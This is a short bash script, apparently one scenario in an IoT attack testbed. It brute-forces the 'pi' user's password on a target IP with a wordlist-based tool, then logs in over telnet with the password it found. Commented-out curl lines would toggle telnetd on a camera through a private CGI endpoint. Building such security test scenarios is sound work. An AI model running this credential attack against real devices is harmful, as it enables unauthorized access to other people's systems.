#!/bin/bash
home="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${home}/scenarios/utils.sh"

IP=$(get_ip "$@")
port=$(get_port)
if [ $? -ne 0 ]; then
    fail "Impossible to parse the IP address."
fi

info "IP is ${IP}"
timestamp

#curl -X POST http://${IP}:${port}/camera-cgi/private/telnetd.cgi?action=start
user=pi
credentials=$(python ${home}/scenarios/brutus.py ${IP} ${user} -w ${home}/scenarios/wordlist)
if [ $? -ne "0" ]; then
    fail "The dictionnary attack failed."
    exit 1
else
    pass=$(echo ${credentials} | cut -d ':' -f 2)
    info "Password discovered for the user '${user}':'${pass}'."
    eval "{ sleep 1; echo ${user}; sleep 1; echo ${pass}; sleep 2; echo 'echo Ça marche !!'; sleep 3; }" | telnet ${IP}
fi
#curl -X POST http://${IP}:${port}/camera-cgi/private/telnetd.cgi?action=stop

timestamp
